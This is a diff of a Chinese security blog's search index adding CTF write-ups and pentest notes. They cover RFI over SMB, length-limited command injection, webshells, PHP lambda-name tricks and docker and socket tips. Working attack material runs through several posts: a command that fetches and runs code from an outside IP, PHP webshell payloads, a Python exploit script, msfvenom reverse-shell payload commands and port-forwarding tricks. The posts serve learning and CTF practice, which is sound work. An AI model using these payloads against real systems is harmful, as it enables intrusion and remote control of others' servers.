@@ -4,11 +4,11 @@
   
     
     <entry>
-      <title>RFI 绕过 getshell</title>
-      <link href="/2020/05/03/RFI-%E7%BB%95%E8%BF%87-getshell/"/>
-      <url>/2020/05/03/RFI-%E7%BB%95%E8%BF%87-getshell/</url>
+      <title>关于linux ls拼接</title>
+      <link href="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/"/>
+      <url>/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/</url>
       
-        <content type="html"><![CDATA[<p>在Seebug看到<a href="https://paper.seebug.org/923/" target="_blank" rel="noopener">RFI 绕过 URL 包含限制 getshell</a>这篇文章，本地调试学习记录一波。</p><p>主要描述php在配置如下时，如何使用SMB协议在局域网内突破远程文件包含getshell。</p><pre><code>allow_url_fopen=offallow_url_include=off</code></pre><p>通过上述配置，PHP不加载远程HTTP或FTP URL，进而防止远程文件包含攻击。但即使<code>allow_url_include</code>和<code>allow_url_fopen</code>都设置为off，PHP也不会阻止SMB URL加载。</p><p>本地进行简单的测试</p><p>include.php</p><pre><code class="php">&lt;?php$file=$_GET[&#39;file&#39;];include($file);?&gt;</code></pre><p>在远程服务器上安装SAMBA服务器：</p><pre><code>apt-get install samba</code></pre><p>创建SMB共享目录：</p><pre><code>mkdir /var/www/html/pub/ </code></pre><p>配置新创建的SMB共享目录的权限：</p><pre><code>chmod 0555 /var/www/html/pub/chown -R nobody:nogroup /var/www/html/pub/</code></pre><p>修改SAMBA服务器配置文件（/etc/samba/smb.conf）内容如下：</p><pre><code>[global]workgroup = WORKGROUPserver string = Samba Server %vnetbios name = indishell-labsecurity = usermap to guest = bad username resolve order = bcast hostdns proxy = nobind interfaces only = yes[ethan]path = /var/www/html/pubwritable = noguest ok = yesguest only = yesread only = yesdirectory mode = 0555force user = nobody</code></pre><p>重新启动SAMBA服务器</p><pre><code>service smbd restart</code></pre><p>同时在/var/www/html/pub/文件夹中放置webshell<br>通过访问<code>file=\\192.168.6.131\ethan\ant.php</code>成功包含远程shell<br><img src="/2020/05/03/RFI-%E7%BB%95%E8%BF%87-getshell/image-20200503094833670.png" alt><br><img src="/2020/05/03/RFI-%E7%BB%95%E8%BF%87-getshell/image-20200503094807579.png" alt></p>]]></content>
+        <content type="html"><![CDATA[<p>参考链接：<a href="https://github.com/orangetw/My-CTF-Web-Challenges" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges</a></p><p>起因源于一个CTF题<br>源码如下：</p><pre><code>&lt;?php    $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 20) {        @exec($_GET[&#39;cmd&#39;]);    } else if (isset($_GET[&#39;reset&#39;])) {        @exec(&#39;/bin/rm -rf &#39; . $sandbox);    }    highlight_file(__FILE__);?&gt;</code></pre><p>限制长度的命令执行：这里单个命令可以输入20个字符，还是比较简单的</p><p>关键点有：<br>1.在linux中，倘若命令过长，可以用续行符（\）来将一行命令变为多行来写。<br>之后可以通过<code>ls</code>经过排序后写入一个新文件（在默认情况下，命令ls，根据名称排序，空格等最前，数字其次，字母最后）<br>2.突破长度限制则是拆分成多次执行</p><p>当然也可以<code>ls &gt;q,cat ...&gt;q,cat /etc/passwd &gt;q</code>等命令执行获取一些信息</p><p>若<code>ls -tr&gt;q</code>长度超出则可以<code>倒序</code>生成文件，再通过<code>ls -t&gt;q</code>生成文件；</p><p>若长度再短，&lt;=5的话（除了第一位的&gt;和最后一位,我们只有三位可控。），先想办法把<code>ls -t&gt;q</code>写入到某个文件中，假设为文件a，然后sh执行文件a，这样命令<code>ls -t</code>的结果就能输出到文件q中。具体操作如下：<br><a href="http://www.bendawang.site/2017/11/15/Hitcon2017-Web-Writeup/" target="_blank" rel="noopener">http://www.bendawang.site/2017/11/15/Hitcon2017-Web-Writeup/</a><br>经过验证并<code>没有</code>如文所示效果，在此仅供参考，之后再深究~</p><pre><code>&gt;ls\\ls&gt;_&gt;\ \\&gt;-t\\&gt;\&gt;gls&gt;&gt;_</code></pre><h2 id="方法一-拼接bash命令，远程curl或wget文件到本地"><a href="#方法一-拼接bash命令，远程curl或wget文件到本地" class="headerlink" title="方法一 拼接bash命令，远程curl或wget文件到本地"></a>方法一 拼接bash命令，远程curl或wget文件到本地</h2><pre><code class="l">&gt;wget\\&gt;\ 35.185.46.221\\&gt;\&gt;1ls -tr&gt;m（即重新调整排序并写入m</code></pre><p><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112257283.png" alt>此时再sh m<em>即可运行m<br><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112327664.png" alt><br>之后再sh i</em>运行从远程vps上下载的index.html内容即可<br>eg : <code>echo &quot;&lt;?php @system($_GET[&#39;z&#39;]);?&gt;&quot; /www/sandbox/a14453a396e26d615c5455c4550119e1/1.php</code><br>curl同理，若命令长度更短，则拆分为更短即可</p><h2 id="方法二-直接通过拼接形成shell"><a href="#方法二-直接通过拼接形成shell" class="headerlink" title="方法二 直接通过拼接形成shell"></a>方法二 直接通过拼接形成shell</h2><p>当服务器上没有wget和curl时，也可以直接通过拼接形成shell</p><pre><code>&gt;\&lt;?php\ &gt;@eval\(\$_GET[1]\);&gt;\ ?\&gt;</code></pre><p><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112510696.png" alt></p><pre><code>ls -tr&gt;2.php</code></pre><p><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112541246.png" alt></p><h2 id="方法三-tar"><a href="#方法三-tar" class="headerlink" title="方法三 tar"></a>方法三 tar</h2><pre><code>&gt;tar&gt;vcf&gt;z* /h*</code></pre><p>先写了三个文件tar，vcf，z，然后执行命令* /h<em>,这样就等效于执行tar vcf z /h<em>。 这样就会把/h</em>打包到z之中，下载下来后即为包含home内容的zip<br><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112609798.png" alt><br>同理也可以下载其他目录的文件</em></p><p>然而大佬的一波骚操作在这：<br><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112628734.png" alt><br>同样通过执行* /t<em>达到了执行tar vcf z /t</em>的效果， 相信大家意识到了，第五个请求，向它传递了一个文件，然后立即打包/t*到文件z,对的没错，利用上传生成的临时文件，将这个临时文件打包到z，然后用php执行，从而达到执行任意命令的目的。</p><pre><code class="python">#!/usr/bin/python# -*- coding: utf-8 -*-import requestsdef GetShell():    url = &quot;https://473831530.trains.virzz.com/?cmd=&quot;    requests.get(&quot;https://473831530.trains.virzz.com/?reset=1&quot;)    #fileNames = [&quot;\&lt;?php\ &quot;,&quot;@eval\(\$_GET[1]\);&quot;,&quot;\ ?\&gt;&quot;]    fileNames = [&quot;\&lt;?php\ &quot;,&quot;@system&quot;,&quot;\(\$_GET[1]\);&quot;,&quot;\ ?\&gt;&quot;]    #fileNames = [&quot;echo\ \&quot;\&lt;?\\&quot;,&quot;php\\&quot;,&quot;\ @system\(\\&quot;,&quot;\$_GET[\&#39;z\&#39;]\)\\&quot;,&quot;;?\&gt;\&quot;\ \&gt;\\&quot;,&quot;\ 1.php&quot;]    #fileNames = [&quot;wget\\&quot;,&quot;\ 35.185.46.221\\&quot;,&quot;\&gt;1&quot;]    #fileNames = [&quot;curl\\&quot;,&quot;\ 35.185.46.221\\&quot;,&quot;\&gt;1&quot;]    #fileNames = [&quot;3.php&quot;,&quot;-O\ \\&quot;,&quot;cn\ \\&quot;,&quot;\ a.\\&quot;,&quot;wget\\&quot;]     #fileNames = [&quot;ls\\&quot;,&quot;&quot;]    for fileName in fileNames:        createFileUrl = url + &quot;&gt;&quot; + fileName        print createFileUrl        requests.get(createFileUrl)    #getShellUrl=url+&quot;ls -tr&gt;m&quot;    getShellUrl=url+&quot;ls -tr&gt;1.php&quot;    print getShellUrl    requests.get(getShellUrl)    #getShellUrl = url + &quot;sh m*&quot;    #print getShellUrl    #requests.get(getShellUrl)    #getShellUrl=url+&quot;sh i*&quot;    #print getShellUrl    #requests.get(getShellUrl)    response=requests.get(&quot;https://473831530.trains.virzz.com/sandbox/fd13f94ad4511ed7724ee641c09f793c/1.php?1=ls&quot;)    print response.contentif __name__ == &quot;__main__&quot;:    GetShell()</code></pre>]]></content>
       
       
       <categories>
@@ -20,9 +20,171 @@
       
         <tags>
             
-            <tag> 文件包含 </tag>
+            <tag> linux </tag>
             
-            <tag> GetShell </tag>
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>踩过的坑</title>
+      <link href="/2020/05/03/%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/"/>
+      <url>/2020/05/03/%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
+      
+        <content type="html"><![CDATA[<h1 id="php访问web页面mkdir"><a href="#php访问web页面mkdir" class="headerlink" title="php访问web页面mkdir"></a>php访问web页面mkdir</h1><p>试了半天未果，究其原因是权限问题，函数使用问题不大<br>索性将整个用户组以及html文件夹下的权限提升<br> <code>root@d15d65c4ea9b:/var/www/html# chown -R www-data:www-data ./</code><br>顺便贴一下源码</p><pre><code>&lt;?php    error_reporting(0);    /*    这里的命令长度限制为20，难度较低    有兴趣的可以研究一下限制命令长度为7，为5甚至更短的情况    */    $sandbox =  md5(&quot;shadow&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    chdir(&#39;sandbox&#39;);    mkdir($sandbox);    chdir($sandbox);    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 20) {        exec($_GET[&#39;cmd&#39;]);    } else if (isset($_GET[&#39;reset&#39;])) {        exec(&#39;/bin/rm -rf &#39; . $sandbox);    }    highlight_file(__FILE__);    echo &quot;&lt;br /&gt; IP : {$_SERVER[&#39;REMOTE_ADDR&#39;]}&quot;;?&gt;</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 备忘录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> tips </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PHP匿名函数</title>
+      <link href="/2020/05/03/PHP%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/"/>
+      <url>/2020/05/03/PHP%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/</url>
+      
+        <content type="html"><![CDATA[<pre><code class="php">&lt;?php$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function SUCTF_$hash(){&quot;    .&quot;global \$MY;&quot;    .&quot;\$MY();&quot;    .&quot;}&quot;);if(isset($_GET[&#39;func_name&#39;])){    $_GET[&quot;func_name&quot;]();    die();}show_source(__FILE__);?&gt;</code></pre><p>获取flag的函数是通过create_function，并没有设置函数名字，但其实这里声明的函数是有函数名的，匿名函数会被设置为\x00lambda_%d，这里的%d是顺序递增的。</p><pre><code class="php">#coding=UTF-8import requestsurl = &quot;http://127.0.0.1:8002/?func_name=\%00lambda_&quot;for i in xrange(0,50):    zz = requests.get(url+str(i))    #print zz.content    if &#39;flag&#39; in zz.content:        print url+str(i)        print zz.content        break</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全杂项 </category>
+          
+          <category> php </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> php </tag>
+            
+            <tag> 函数 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>docker tips</title>
+      <link href="/2020/05/03/docker/"/>
+      <url>/2020/05/03/docker/</url>
+      
+        <content type="html"><![CDATA[<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><h2 id="导出："><a href="#导出：" class="headerlink" title="导出："></a>导出：</h2><p>docker export [id] &gt; back.rar</p><h2 id="运行："><a href="#运行：" class="headerlink" title="运行："></a>运行：</h2><p>docker exec -it [id] /bin/bash</p><p>docker run -d -p 8000:80 medicean/vulapps:n_nginx_1</p><p>docker run -it -p 7070:7070 opensecurity/cmsscan</p><h2 id="删除所有容器"><a href="#删除所有容器" class="headerlink" title="删除所有容器"></a>删除所有<none>容器</none></h2><p>$ docker stop $(docker ps -a | grep “Exited” | awk ‘{print $1 }’)  //停止容器 </p><p>$ docker rm $(docker ps -a | grep “Exited” | awk ‘{print $1 }’)  //删除容器 </p><p>$ docker rmi $(docker images | grep “none” | awk ‘{print $3}’)  //删除镜像 </p><h2 id="共享主机与docker目录"><a href="#共享主机与docker目录" class="headerlink" title="共享主机与docker目录"></a>共享主机与docker目录</h2><p>sudo docker run -it -p 8080:80 -v /home/root/Desktop/www:/var/www/html e57b13556a9c /bin/bash</p><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>1.停止所有的container，这样才能够删除其中的images：</p><p>docker stop $(docker ps -a -q)</p><p>如果想要删除所有container的话再加一个指令：</p><p>docker rm $(docker ps -a -q)</p><p>2.查看当前有些什么images</p><p>docker images</p><p>3.删除images，通过image的id来指定删除谁</p><p>docker rmi <image id></image></p><p>想要删除untagged images，也就是那些id为<None>的image的话可以用</None></p><p>docker rmi $(docker images | grep “^<none>“ | awk “{print $3}”)</none></p><p>要删除全部image的话</p><p>docker rmi $(docker images -q)</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 备忘录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> docker </tag>
+            
+            <tag> tips </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Socket实现http，https请求</title>
+      <link href="/2020/05/03/Socket%E5%AE%9E%E7%8E%B0http%EF%BC%8Chttps%E8%AF%B7%E6%B1%82/"/>
+      <url>/2020/05/03/Socket%E5%AE%9E%E7%8E%B0http%EF%BC%8Chttps%E8%AF%B7%E6%B1%82/</url>
+      
+        <content type="html"><![CDATA[<p>拿到某CTF题服务器shell后，发现只能通过python3调用socket库向内网发送请求：</p><blockquote><p>关于python的HTTP请求方式</p></blockquote><p>HTTP请求步骤为：</p><blockquote><ol><li>域名解析</li><li>发起TCP的3次握手</li><li>建立TCP连接后发起http请求</li><li>服务器端响应http请求，浏览器得到html代码</li><li>浏览器解析html代码，并请求html代码中的资源</li><li>浏览器对页面进行渲染呈现给用户</li></ol></blockquote><p>简化为：<br>DNS解析（浏） -&gt;TCP连接（三次握手）-&gt;http Requests（浏）-&gt;Response（服） -&gt; Parse（浏）-&gt; Render（浏）-&gt;TCP断开（四次挥手）</p><blockquote><p>SOCKET访问web http</p></blockquote><pre><code class="python">import socketurl = &#39;172.16.233.111&#39;port = 80sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sock.connect((url, port))request_url = &#39;GET / HTTP/1.1\r\nHost: 172.16.233.111\r\nConnection: close\r\n\r\n&#39;sock.send(request_url.encode())response = b&#39;&#39;rec = sock.recv(1024)while rec:    response += rec    rec = sock.recv(1024)print(response.decode())</code></pre><blockquote><p>SOCKET访问https</p></blockquote><pre><code class="python">import socketimport sslurl = &#39;dps-precheck-h.camcard.com&#39;port = 443sock = ssl.wrap_socket(socket.socket())sock.connect((url, port))request_url = &#39;GET /api/v1/block/block_info?id=dpsv45_9aeb8b0e953711e7af605254003cf65b HTTP/1.1\r\nHost: dps-precheck-h.camcard.com\r\nConnection: close\r\n\r\n&#39;sock.send(request_url.encode())response = b&#39;&#39;rec = sock.recv(1024)while rec:    response += rec    rec = sock.recv(1024)print(response.decode())</code></pre><p>参考文章：<a href="https://blog.csdn.net/zzzzzztt/article/details/80861135" target="_blank" rel="noopener">https://blog.csdn.net/zzzzzztt/article/details/80861135</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 备忘录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> socket </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>msfvenom生成木马</title>
+      <link href="/2020/05/03/msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/"/>
+      <url>/2020/05/03/msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>　　msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elf</p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>　　msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f exe &gt; shell.exe</Your></Your></p><h1 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h1><p>　　msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f macho &gt; shell.machoWeb Payloads</Your></Your></p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>　　msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f raw &gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</Your></Your></p><h1 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h1><p>　　msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f asp &gt; shell.asp</Your></Your></p><h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><p>　　msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f raw &gt; shell.jsp</Your></Your></p><h1 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h1><p>　　msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f war &gt; shell.war<br>Scripting Payloads</Your></Your></p><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>　　msfvenom -p cmd/unix/reverse_python LHOST=<Your ip address> LPORT=<Your port to connect on> -f raw &gt; shell.py</Your></Your></p><h1 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h1><p>　　msfvenom -p cmd/unix/reverse_bash LHOST=<Your ip address> LPORT=<Your port to connect on> -f raw &gt; shell.sh</Your></Your></p><h1 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h1><p>　　msfvenom -p cmd/unix/reverse_perl LHOST=<Your ip address> LPORT=<Your port to connect on> -f raw &gt; shell.pl</Your></Your></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 备忘录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pentset </tag>
+            
+            <tag> msf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pentest tips</title>
+      <link href="/2020/05/03/pentest/"/>
+      <url>/2020/05/03/pentest/</url>
+      
+        <content type="html"><![CDATA[<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>nmap -sS -p 1-65535 -v 192.168.1.254<br>nmap -sV 10.10.10.11<br>nmap -sV -sT -sC -T5 10.10.10.122<br>nmap -sC -sV -sS</p><h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h2 id="cmd进行端口转发"><a href="#cmd进行端口转发" class="headerlink" title="cmd进行端口转发"></a>cmd进行端口转发</h2><p>把来自外部的 tcp 的6666端口流量全部转发到内网的2008r2机器的3389端口上，执行以下两条命令</p><pre><code>netsh advfirewall firewall add rule name=&quot;winmgmt&quot; dir=in action=allow protocol=TCP localport=6666netsh interface portproxy add v4tov4 listenport=6666 connectaddress=192.168.2.57 connectport=3389</code></pre><p><img src="/2020/05/03/pentest/image-20200503104122591.png" alt></p><h2 id="切换成交互式shell"><a href="#切换成交互式shell" class="headerlink" title="切换成交互式shell"></a>切换成交互式shell</h2><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>参考<a href="https://www.freebuf.com/news/142195.html" target="_blank" rel="noopener">https://www.freebuf.com/news/142195.html</a><br><img src="/2020/05/03/pentest/image-20200503104154689.png" alt></p><h2 id="SMB服务"><a href="#SMB服务" class="headerlink" title="SMB服务:"></a>SMB服务:</h2><p>匿名身份进行资源枚举:smbmap -H 10.10.10.152</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 备忘录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pentest </tag>
+            
+            <tag> tips </tag>
             
         </tags>
       
@@ -59,16 +221,70 @@
       
       <categories>
           
-          <category> Writeup </category>
+          <category> writeup </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> QWB </tag>
+            <tag> writeup </tag>
             
-            <tag> Writeup </tag>
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>RFI 绕过 getshell</title>
+      <link href="/2019/05/29/RFI-%E7%BB%95%E8%BF%87-getshell/"/>
+      <url>/2019/05/29/RFI-%E7%BB%95%E8%BF%87-getshell/</url>
+      
+        <content type="html"><![CDATA[<p>在Seebug看到<a href="https://paper.seebug.org/923/" target="_blank" rel="noopener">RFI 绕过 URL 包含限制 getshell</a>这篇文章，本地调试学习记录一波。</p><p>主要描述php在配置如下时，如何使用SMB协议在局域网内突破远程文件包含getshell。</p><pre><code>allow_url_fopen=offallow_url_include=off</code></pre><p>通过上述配置，PHP不加载远程HTTP或FTP URL，进而防止远程文件包含攻击。但即使<code>allow_url_include</code>和<code>allow_url_fopen</code>都设置为off，PHP也不会阻止SMB URL加载。</p><p>本地进行简单的测试</p><p>include.php</p><pre><code class="php">&lt;?php$file=$_GET[&#39;file&#39;];include($file);?&gt;</code></pre><p>在远程服务器上安装SAMBA服务器：</p><pre><code>apt-get install samba</code></pre><p>创建SMB共享目录：</p><pre><code>mkdir /var/www/html/pub/ </code></pre><p>配置新创建的SMB共享目录的权限：</p><pre><code>chmod 0555 /var/www/html/pub/chown -R nobody:nogroup /var/www/html/pub/</code></pre><p>修改SAMBA服务器配置文件（/etc/samba/smb.conf）内容如下：</p><pre><code>[global]workgroup = WORKGROUPserver string = Samba Server %vnetbios name = indishell-labsecurity = usermap to guest = bad username resolve order = bcast hostdns proxy = nobind interfaces only = yes[ethan]path = /var/www/html/pubwritable = noguest ok = yesguest only = yesread only = yesdirectory mode = 0555force user = nobody</code></pre><p>重新启动SAMBA服务器</p><pre><code>service smbd restart</code></pre><p>同时在/var/www/html/pub/文件夹中放置webshell<br>通过访问<code>file=\\192.168.6.131\ethan\ant.php</code>成功包含远程shell<br><img src="/2019/05/29/RFI-%E7%BB%95%E8%BF%87-getshell/image-20200503094833670.png" alt><br><img src="/2019/05/29/RFI-%E7%BB%95%E8%BF%87-getshell/image-20200503094807579.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全杂项 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件包含 </tag>
+            
+            <tag> getshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PHP敏感函数</title>
+      <link href="/2019/05/22/PHP%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/"/>
+      <url>/2019/05/22/PHP%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a><a href="http://www.am0s.com/functions/406.html" target="_blank" rel="noopener">parse_url()</a></h2><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a><a href="http://www.am0s.com/functions/386.html" target="_blank" rel="noopener">file_put_contents()</a></h2><h2 id="json-encode"><a href="#json-encode" class="headerlink" title="json_encode()"></a><a href="http://www.am0s.com/functions/383.html" target="_blank" rel="noopener">json_encode()</a></h2><h2 id="imagecreatefromgif"><a href="#imagecreatefromgif" class="headerlink" title="imagecreatefromgif()"></a><a href="http://www.am0s.com/functions/323.html" target="_blank" rel="noopener">imagecreatefromgif()</a></h2><h2 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a><a href="http://www.am0s.com/functions/264.html" target="_blank" rel="noopener">mt_rand()</a></h2><h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a><a href="http://www.am0s.com/functions/261.html" target="_blank" rel="noopener">addslashes()</a></h2><h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv()"></a><a href="http://www.am0s.com/functions/256.html" target="_blank" rel="noopener">iconv()</a></h2><h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file()"></a><a href="http://www.am0s.com/functions/248.html" target="_blank" rel="noopener">move_uploaded_file()</a></h2><h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><a href="http://www.am0s.com/functions/247.html" target="_blank" rel="noopener">session_id()</a></h2><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a><a href="http://www.am0s.com/functions/240.html" target="_blank" rel="noopener">in_array()</a></h2><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a><a href="http://www.am0s.com/functions/238.html" target="_blank" rel="noopener">parse_str()</a></h2><h2 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a><a href="http://www.am0s.com/functions/237.html" target="_blank" rel="noopener">escapeshellarg()</a></h2><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a><a href="http://www.am0s.com/functions/235.html" target="_blank" rel="noopener">create_function()</a></h2><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a><a href="http://www.am0s.com/functions/233.html" target="_blank" rel="noopener">preg_replace()</a></h2><h2 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a><a href="http://www.am0s.com/functions/227.html" target="_blank" rel="noopener">escapeshellcmd()</a></h2><h2 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode()"></a><a href="http://www.am0s.com/functions/226.html" target="_blank" rel="noopener">urldecode()</a></h2><h2 id="copy"><a href="#copy" class="headerlink" title="copy()"></a><a href="http://www.am0s.com/functions/222.html" target="_blank" rel="noopener">copy()</a></h2><h2 id="return"><a href="#return" class="headerlink" title="return()"></a><a href="http://www.am0s.com/functions/221.html" target="_blank" rel="noopener">return()</a></h2><h2 id="exit"><a href="#exit" class="headerlink" title="exit()"></a><a href="http://www.am0s.com/functions/210.html" target="_blank" rel="noopener">exit()</a></h2><h2 id="eregi"><a href="#eregi" class="headerlink" title="eregi()"></a><a href="http://www.am0s.com/functions/203.html" target="_blank" rel="noopener">eregi()</a></h2><h2 id="md5"><a href="#md5" class="headerlink" title="md5()"></a><a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">md5()</a></h2><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a><a href="http://www.am0s.com/functions/201.html" target="_blank" rel="noopener">strcmp()</a></h2><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a><a href="http://www.am0s.com/functions/199.html" target="_blank" rel="noopener">is_numeric()</a></h2><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a><a href="http://www.am0s.com/functions/193.html" target="_blank" rel="noopener">intval()</a></h2><h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a><a href="http://www.am0s.com/functions/181.html" target="_blank" rel="noopener">htmlspecialchars()</a></h2><h2 id="usort"><a href="#usort" class="headerlink" title="usort()"></a><a href="http://www.am0s.com/functions/97.html" target="_blank" rel="noopener">usort()</a></h2><h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a><a href="http://www.am0s.com/functions/87.html" target="_blank" rel="noopener">extract()</a></h2><h2 id="Mail"><a href="#Mail" class="headerlink" title="Mail()"></a><a href="http://www.am0s.com/functions/77.html" target="_blank" rel="noopener">Mail()</a></h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全杂项 </category>
+          
+          <category> php </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> php </tag>
+            
+            <tag> 函数 </tag>
             
         </tags>
       
@@ -99,6 +315,64 @@
             
             <tag> 代码审计 </tag>
             
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>“鹏城杯”2018部分web wp</title>
+      <link href="/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/"/>
+      <url>/2018/12/02/%E2%80%9C%E9%B9%8F%E5%9F%8E%E6%9D%AF%E2%80%9D2018%E9%83%A8%E5%88%86web-wp/</url>
+      
